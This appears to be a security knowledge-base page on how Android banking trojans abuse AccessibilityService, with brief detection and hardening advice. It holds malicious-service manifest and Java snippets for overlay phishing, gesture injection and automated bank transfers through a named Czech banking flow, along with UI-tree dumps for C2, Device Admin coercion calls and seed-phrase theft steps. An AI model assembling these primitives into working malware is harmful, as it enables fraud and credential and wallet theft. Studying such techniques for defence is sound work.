# Android Accessibility Service Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

`AccessibilityService` was created to help users with disabilities interact with Android devices.  Unfortunately, the same **powerful automation APIs** (global navigation, text input, gesture dispatch, overlay windows…) can be weaponised by malware to gain **complete remote control** of the handset _without root privileges_.

Modern Android banking Trojans and Remote-Access-Trojans (RATs) such as **PlayPraetor, SpyNote, BrasDex, SOVA, ToxicPanda** and many others follow the same recipe:

1. Social-engineer the victim into enabling a rogue accessibility service (the *BIND_ACCESSIBILITY_SERVICE* permission is considered "high-risk" and requires an explicit user action).
2. Leverage the service to
   * capture every UI event & text that appears on screen,
   * inject synthetic gestures (`dispatchGesture`) and global actions (`performGlobalAction`) to automate any task the operator desires,
   * draw full-screen overlays on top of legitimate apps using the **TYPE_ACCESSIBILITY_OVERLAY** window type (no `SYSTEM_ALERT_WINDOW` prompt!),
   * silently grant additional runtime permissions by clicking on the system dialogs on the victim’s behalf.
3. Exfiltrate data or perform **On-Device-Fraud (ODF)** in real-time while the user is looking at a perfectly normal screen.

## Requesting the permission

```xml
<!-- AndroidManifest.xml -->
<service
    android:name="com.evil.rat.EvilService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">

    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>

    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/evil_accessibility_config"/>
</service>
```

The companion XML defines how the fake dialog will look like:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/service_description"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="200"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"/>
```

---

## Remote UI automation primitives

```java
public class EvilService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // harvest text or detect foreground app change
    }

    // Simulate HOME / BACK / RECENTS …
    private void navHome()     { performGlobalAction(GLOBAL_ACTION_HOME); }
    private void navBack()     { performGlobalAction(GLOBAL_ACTION_BACK); }
    private void openRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }

    // Generic tap / swipe
    public void tap(float x, float y) {
        Path p = new Path(); p.moveTo(x, y);
        GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
        dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
    }
}
```

With only these two APIs an attacker can:
* Unlock the screen, open the banking app, navigate its UI tree and submit a transfer form.
* Accept every permission dialog that pops up.
* Install/update extra APKs via the Play Store intent.

## Abuse patterns

### 1. Overlay Phishing (Credential Harvesting)
A transparent or opaque `WebView` is added to the window manager:

```java
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
        MATCH_PARENT, MATCH_PARENT,
        TYPE_ACCESSIBILITY_OVERLAY,                      // ⬅ bypasses SYSTEM_ALERT_WINDOW
        FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL,       // touches still reach the real app
        PixelFormat.TRANSLUCENT);
wm.addView(phishingView, lp);
```

The victim types credentials into the fake form while the background app receives the same gestures – no suspicious "draw over other apps" prompt is ever shown.

> Detailed example: the *Accessibility Overlay Phishing* section inside the Tapjacking page.

### 2. On-Device Fraud automation
Malware families such as **PlayPraetor** maintain a persistent WebSocket channel where the operator can issue high-level commands (`init`, `update`, `alert_arr`, `report_list`, …).  The service translates those commands into the low-level gestures above, achieving real-time unauthorized transactions that easily bypass multi-factor-authentication tied to that very device.

### 3. Screen streaming & monitoring
By combining the **MediaProjection API** with an RTMP client library, the RAT can broadcast the live framebuffer to `rtmp://<c2>:1935/live/<device_id>`, giving the adversary perfect situational awareness while the Accessibility engine drives the UI.

---

## PlayPraetor – command & control workflow

1. **HTTP(S) heartbeat** – iterate over a hard-coded list until one domain answers `POST /app/searchPackageName` with the active C2.
2. **WebSocket (port 8282)** – bidirectional JSON commands:
   * `update` – push new conf/APKs
   * `alert_arr` – configure overlay templates
   * `report_list` – send list of targeted package names
   * `heartbeat_web` – keep-alive
3. **RTMP (port 1935)** – live screen/video streaming.
4. **REST exfiltration** –
   * `/app/saveDevice` (fingerprint)
   * `/app/saveContacts` | `/app/saveSms` | `/app/uploadImageBase64`
   * `/app/saveCardPwd` (bank creds)

The **AccessibilityService** is the local engine that turns those cloud commands into physical interactions.

---

## Detecting malicious accessibility services

* `adb shell settings get secure enabled_accessibility_services`
* Settings → Accessibility → *Downloaded services* – look for apps that are **not** from Google Play.
* MDM / EMM solutions can enforce `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (Android 13+) to block sideloaded services.
* Analyse running services:
  ```bash
  adb shell dumpsys accessibility | grep "Accessibility Service"
  ```

---

## Hardening recommendations for app developers

* Mark sensitive views with `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+).
* Combine `setFilterTouchesWhenObscured(true)` with `FLAG_SECURE` to prevent tap/overlay hijacking.
* Detect overlays by polling `WindowManager.getDefaultDisplay().getFlags()` or the `ViewRootImpl` API.
* Refuse to operate when `Settings.canDrawOverlays()` **or** a non-trusted Accessibility service is active.

## ATS automation cheat-sheet (Accessibility-driven)
Malware can fully automate a bank app with only Accessibility APIs. Generic primitives:

```java
// Helpers inside your AccessibilityService
private List<AccessibilityNodeInfo> byText(String t){
  AccessibilityNodeInfo r = getRootInActiveWindow();
  return r == null ? Collections.emptyList() : r.findAccessibilityNodeInfosByText(t);
}
private boolean clickText(String t){
  for (AccessibilityNodeInfo n: byText(t)){
    if (n.isClickable()) return n.performAction(ACTION_CLICK);
    AccessibilityNodeInfo p = n.getParent();
    if (p != null) return p.performAction(ACTION_CLICK);
  }
  return false;
}
private void inputText(AccessibilityNodeInfo field, String text){
  Bundle b = new Bundle(); b.putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
  field.performAction(ACTION_SET_TEXT, b);
}
private void tap(float x, float y){
  Path p = new Path(); p.moveTo(x,y);
  dispatchGesture(new GestureDescription.Builder()
    .addStroke(new GestureDescription.StrokeDescription(p,0,40)).build(), null, null);
}
```

Example flow (Czech → English labels):
- "Nová platba" (New payment) → click
- "Zadat platbu" (Enter payment) → click
- "Nový příjemce" (New recipient) → click
- "Domácí číslo účtu" (Domestic account number) → focus and `ACTION_SET_TEXT`
- "Další" (Next) → click → … "Zaplatit" (Pay) → click → enter PIN

Fallback: hard-coded coordinates with `dispatchGesture` when text lookup fails due to custom widgets.

Also seen: pre-steps to `check_limit` and `limit` by navigating to limits UI and increasing daily limits before transfer.

## Text-based pseudo-screen streaming
For low-latency remote control, instead of full video streaming, dump a textual representation of the current UI tree and send it to C2 repeatedly.

```java
private void dumpTree(AccessibilityNodeInfo n, String indent, StringBuilder sb){
  if (n==null) return;
  Rect b = new Rect(); n.getBoundsInScreen(b);
  CharSequence txt = n.getText(); CharSequence cls = n.getClassName();
  sb.append(indent).append("[").append(cls).append("] ")
    .append(txt==null?"":txt).append(" ")
    .append(b.toShortString()).append("\n");
  for (int i=0;i<n.getChildCount();i++) dumpTree(n.getChild(i), indent+"  ", sb);
}
```

This is the basis for commands like `txt_screen` (one-shot) and `screen_live` (continuous).

## Device Admin coercion primitives
Once a Device Admin receiver is activated, these calls increase opportunities to capture credentials and maintain control:

```java
DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
ComponentName admin = new ComponentName(this, AdminReceiver.class);

// 1) Immediate lock
dpm.lockNow();

// 2) Force credential change (expire current PIN/password)
dpm.setPasswordExpirationTimeout(admin, 1L); // may require owner/profile-owner on recent Android

// 3) Disable biometric unlock to force PIN/pattern entry
int flags = DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
            DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS;
dpm.setKeyguardDisabledFeatures(admin, flags);
```

Note: the exact availability of these policies varies by Android version and OEM; validate the device policy role (admin vs owner) during testing.

## Crypto wallet seed-phrase extraction patterns
Observed flows for MetaMask, Trust Wallet, Blockchain.com and Phantom:
- Unlock with stolen PIN (captured via overlay/Accessibility) or provided wallet password.
- Navigate: Settings → Security/Recovery → Reveal/Show recovery phrase.
- Collect phrase via keylogging the text nodes, secure-screen bypass, or screenshot OCR when text is obscured.
- Support multiple locales (EN/RU/CZ/SK) to stabilise selectors – prefer `viewIdResourceName` when available, fallback to multilingual text matching.

## NFC-relay orchestration
Accessibility/RAT modules can install and launch a dedicated NFC-relay app (e.g., NFSkate) as a third stage and even inject an overlay guide to shepherd the victim through card-present relay steps.

## Sturnus – Accessibility-driven banking trojan patterns

### Hybrid HTTP/WSS key exchange
- Registration starts over HTTP with a dummy `POST`, to which the C2 responds with a UUID and an RSA public key.
- The implant generates a 256-bit AES key locally, encrypts it with `RSA/ECB/OAEPWithSHA-1AndMGF1Padding`, and returns it; the plaintext AES key is cached on-disk (Base64) for later use.
- Every payload afterwards is wrapped as: `IV (16 bytes) || AES/CBC/PKCS5Padding(ciphertext)` and finally encapsulated inside a binary header containing message type, length, and client UUID.
- A parallel WSS session is kept for interactive tooling (VNC/HVNC), so red-team implants can preserve low-latency control while still benefiting from per-device symmetric keys.

### Overlay WebView harvesting & blackout view
- Phishing templates are staged under `/data/user/0/<malware_pkg>/files/overlays/`, one HTML file per targeted bank.
- Whenever the monitored package hits the foreground, the malware launches a dedicated Activity with a `WebView` that enables JavaScript, DOM storage, and `addJavascriptInterface` to bridge form events to native code.
- Credentials/OTPs entered inside the overlay are pushed to C2 in real time and the template is disabled to avoid repeated prompts; a separate “black overlay” Activity can be toggled to show a fullscreen blank canvas that hides ongoing fraud.

### UI-tree telemetry to defeat messenger E2EE
- The Accessibility service subscribes to `TYPE_VIEW_TEXT_CHANGED`, `TYPE_VIEW_FOCUSED`, `TYPE_VIEW_CLICKED`, and `TYPE_WINDOW_CONTENT_CHANGED`.
- When `com.whatsapp`, `org.telegram.messenger`, or `org.thoughtcrime.securesms` becomes foreground, the service accelerates UI-tree dumps and associates typed text with the focused input node, so decrypted chats are replicated for the operator without touching TLS/E2EE.
- The same event stream feeds PIN-solver routines that observe lockscreen digit order and can later replay the unlock sequence to remove user presence requirements.

### Dual-vision remote control + Accessibility actions
- Primary visibility relies on `MediaProjection` → native framebuffer → VNC RFB encoder (both visible `START_VNC` and headless `START_HVNC` modes), while a fallback Accessibility-based screenshotter keeps working when `FLAG_SECURE` or revoked capture permissions block the main stream.
- In parallel, the service serialises node metadata (`nodesInfo`) and exposes high-level commands such as `buttonAction` (HOME/BACK/RECENTS), `clickNode`, `textSender`, `gensureScroll`, `lastClickedNode`, `enableBlackScreen`, `disableBlackScreen`, `PIN_SOLVER`, and `REQUEST_PERMISSION` so the operator can script UI manipulations by ID rather than by raw coordinates.
- This split channel lets attackers approve transfers, fill KYC forms, or accept runtime permission dialogs while the victim only sees a static/black screen.

### Device-admin defence & environment watchdog
- After obtaining Device Admin rights, the RAT continuously watches for Settings screens that could revoke them; matching Accessibility nodes are programmatically defocused or the UI is auto-navigated away to prevent removal.
- Admin events (password changes, failed unlocks, remote locks) are forwarded to C2, and uninstall attempts fail until the admin component is forcibly deactivated.
- A fleet of broadcast receivers plus a “security-check” thread collect network/power/SIM/USB changes, developer-mode and ADB status, SELinux mode, patch level, and rooting/forensic artefacts; those telemetry feeds drive logic such as lowering beacon rates in emulators or triggering self-destruct when instrumentation is detected.
